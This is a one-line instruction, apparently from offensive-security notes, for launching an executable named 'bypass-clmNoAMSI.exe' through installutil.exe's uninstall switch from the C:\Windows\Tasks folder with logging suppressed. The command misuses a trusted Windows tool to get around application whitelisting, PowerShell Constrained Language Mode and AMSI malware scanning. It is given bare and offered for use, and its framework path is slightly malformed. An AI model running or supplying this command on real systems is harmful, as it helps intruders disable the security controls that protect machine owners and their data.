Run it with C:\Windows\Microsoft.NET\Framework64 4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks bypass-clmNoAMSI.exe
